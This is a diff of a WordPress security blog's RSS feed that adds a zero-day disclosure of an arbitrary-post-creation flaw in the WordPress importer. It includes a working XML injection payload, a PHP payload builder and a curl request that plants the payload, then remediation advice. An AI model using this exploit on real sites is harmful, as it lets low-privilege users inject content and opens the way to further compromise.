@@ -12,7 +12,7 @@
 	<atom:link href="https://wpdeeply.com/tag/0day/feed/" rel="self" type="application/rss+xml" />
 	<link>http://wpdeeply.com/</link>
 	<description></description>
-	<lastBuildDate>Tue, 21 Jul 2020 21:02:46 +0000</lastBuildDate>
+	<lastBuildDate>Thu, 23 Jul 2020 22:25:40 +0000</lastBuildDate>
 	<language>en-US</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
@@ -20,6 +20,132 @@
 	1	</sy:updateFrequency>
 	<generator>https://wordpress.org/?v=5.4.2</generator>
 	<item>
+		<title>WordPress importer arbitrary post create</title>
+		<link>https://wpdeeply.com/wordpress-importer-arbitrary-post-create/</link>
+		
+		<dc:creator><![CDATA[root]]></dc:creator>
+		<pubDate>Thu, 23 Jul 2020 22:24:27 +0000</pubDate>
+				<category><![CDATA[core]]></category>
+		<category><![CDATA[plugins]]></category>
+		<category><![CDATA[0day]]></category>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=169</guid>
+
+					<description><![CDATA[Native WordPress importer have 3 different parser classes:&#160;WXR_Parser_SimpleXML,&#160;WXR_Parser_XML&#160;and&#160;WXR_Parser_Regex. If first two required PHP extensions (simplexml&#160;and&#160;xml) aren&#8217;t installed or somehow they fail during export file parsing, then everything should be done by&#160;WXR_Parser_Regex&#160;class. Failing could occure because: malformed XML file Huge XML file with lot of data (libxml doesn&#8217;t obay memory constraints from php.ini) most important one: [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p>Native WordPress importer have 3 different parser classes:&nbsp;<code>WXR_Parser_SimpleXML</code>,&nbsp;<code>WXR_Parser_XML</code>&nbsp;and&nbsp;<code>WXR_Parser_Regex</code>. If first two required PHP extensions (<code>simplexml</code>&nbsp;and&nbsp;<code>xml</code>) aren&#8217;t installed or somehow they fail during export file parsing, then everything should be done by&nbsp;<code>WXR_Parser_Regex</code>&nbsp;class.</p>
+
+
+
+<p>Failing could occure because:</p>
+
+
+
+<ul><li>malformed XML file</li><li>Huge XML file with lot of data (libxml doesn&#8217;t obay memory constraints from php.ini)</li><li>most important one: those extensions can&#8217;t parse XML data that holds ascii control characters in it.</li></ul>
+
+
+
+<p>In the&nbsp;<code>WXR_Parser_Regex</code>&nbsp;we have following</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">foreach ( $multiline_tags as $tag => $handler ) {
+	// Handle multi-line tags on a singular line
+	if ( preg_match( '|&lt;' . $tag . '>(.*?)&lt;/' . $tag . '>|is', $importline, $matches ) ) {
+...
+</code></pre>
+
+
+
+<p>and this means that somewhere in the user input if there is&nbsp;<code>&lt;/item&gt;</code>&nbsp;we talk about end of the post. We all know that meta / custom fields can hold anything, so we have our entry point. Fallback towards&nbsp;<code>WXR_Parser_Regex</code>&nbsp;checked and entry point checked, time for demo.</p>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-importer-arbitrary-post-create.md#eli5-poc"></a>Eli5 PoC</h2>
+
+
+
+<p>On any WP instance log in with&nbsp;<code>contributor</code>&nbsp;user role. Create blog post and add meta / custom field with following value <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /> Template payload for meta value:</p>
+
+
+
+<pre class="wp-block-code"><code lang="xml" class="language-xml">&lt;/wp:meta_value>&lt;/wp:postmeta>&lt;/item>
+[asciicontrol]
+&lt;item>
+&lt;title>Attack-Post-1337&lt;/title>
+&lt;link>http://attack.post/2020/07/19/attack-post/&lt;/link>
+&lt;pubDate>Sun, 19 Jul 2020 20:57:17 +0000&lt;/pubDate>
+&lt;dc:creator>attacker&lt;/dc:creator>
+&lt;guid isPermaLink="false">http://attack.post?p=1337&lt;/guid>
+&lt;description>&lt;/description>
+&lt;content:encoded>&lt;!-- wp:paragraph -->
+&lt;p>boom jee&lt;/p>
+&lt;!-- /wp:paragraph -->&lt;/content:encoded>
+&lt;excerpt:encoded>&lt;/excerpt:encoded>
+&lt;wp:post_id>1337&lt;/wp:post_id>
+&lt;wp:post_date>2020-07-19 20:57:17&lt;/wp:post_date>
+&lt;wp:post_date_gmt>2020-07-19 20:57:17&lt;/wp:post_date_gmt>
+&lt;wp:comment_status>open&lt;/wp:comment_status>
+&lt;wp:ping_status>open&lt;/wp:ping_status>
+&lt;wp:post_name>attack-post&lt;/wp:post_name>
+&lt;wp:status>publish&lt;/wp:status>
+&lt;wp:post_parent>0&lt;/wp:post_parent>
+&lt;wp:menu_order>0&lt;/wp:menu_order>
+&lt;wp:post_type>post&lt;/wp:post_type>
+&lt;wp:post_password>&lt;/wp:post_password>
+&lt;wp:is_sticky>0&lt;/wp:is_sticky>
+&lt;category domain="category" nicename="uncategorized">Uncategorized&lt;/category>
+&lt;wp:postmeta>
+&lt;wp:meta_key>_test&lt;/wp:meta_key>
+&lt;wp:meta_value></code></pre>
+
+
+
+<p>prepare this template payload on the following way</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">//grab the content
+$cnt = file_get_contents("attack-template.txt");
+//add ascii control characters
+$cnt = str_replace("[asciicontrol]", "\x00\x01\x02\x08\x16", $cnt);
+//url encode it and it is ready to be used towards any meta (custom) field as value
+file_put_contents("final-payload.txt", urlencode($cnt));
+</code></pre>
+
+
+
+<p>and create the meta / custom field as&nbsp;<code>contributor</code>.</p>
+
+
+
+<pre class="wp-block-code"><code lang="bash" class="language-bash">curl 'http://local.target/wp-admin/admin-ajax.php' -H 'Cookie: ...' --data '_ajax_nonce=0&amp;action=add-meta&amp;metakeyselect=%23NONE%23&amp;metakeyinput=wpdeeply&amp;metavalue=[content_from_final-payload.txt]&amp;_ajax_nonce-add-meta=61b457d48c&amp;post_id=[your_post_id]' --compressed
+</code></pre>
+
+
+
+<p>Now log in as&nbsp;<code>administrator</code>&nbsp;export the Posts and import them anywhere you want. Say hello to extra post of any type with any data created by &nbsp;<code>contributor</code>.</p>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-importer-arbitrary-post-create.md#few-facts"></a>Few facts</h2>
+
+
+
+<ul><li>Many mainstream plugins accept raw user input in meta / custom fields</li><li>RCE could be achieved without user/attacker interaction when import occurs. <a href="https://wpdeeply.com/wordpress-null-byte-to-rce-0-day-bug/" target="_blank" rel="noreferrer noopener">Example 1</a> and <a href="https://wpdeeply.com/wordpress-write-image-to-any-directory-rce/" target="_blank" rel="noreferrer noopener">Example 2</a></li><li><a href="https://wpdeeply.com/wordpress-updates-from-core-and-security/" target="_blank" rel="noreferrer noopener">persistence</a> and <a href="https://github.com/Slavco/wp-weaver" target="_blank" rel="noreferrer noopener">stealth agents</a> planting is 100% option in WP</li></ul>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-importer-arbitrary-post-create.md#remediation"></a>Remediation</h2>
+
+
+
+<ul><li>Sign the posts / data exported and check the signature with data need to be imported</li><li>Follow 101 security practices for web applications</li></ul>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
 		<title>LearnPress SQLi to RCE</title>
 		<link>https://wpdeeply.com/learnpress-sqli-to-rce/</link>
 		
@@ -422,6 +548,7 @@ if ( isset($_REQUEST["wppply"])){
 		<dc:creator><![CDATA[root]]></dc:creator>
 		<pubDate>Fri, 17 Jul 2020 19:38:25 +0000</pubDate>
 				<category><![CDATA[core]]></category>
+		<category><![CDATA[plugins]]></category>
 		<category><![CDATA[0day]]></category>
 		<guid isPermaLink="false">https://wpdeeply.com/?p=146</guid>
 
@@ -479,7 +606,7 @@ if ( isset($_REQUEST["wppply"])){
 
 
 
-<ul><li>Don&#8217;t allow wordpress-importer to fall back on the <code>class WXR_Parser_Regex</code></li><li>Do not assign <strong>import</strong> user capabilities on WP related projects </li><li>Add  <code>_wp_attachment_backup_sizes</code> in the blocked list in the wordpress-importer code</li></ul>
+<ul><li>Don&#8217;t allow wordpress-importer to fall back on the&nbsp;<code>class WXR_Parser_Regex</code></li><li>Do not assign <strong>import</strong> user capabilities on WP related projects </li><li>Add &nbsp;<code>_wp_attachment_backup_sizes</code> in the blocked list in the wordpress-importer code</li></ul>
 
 
 
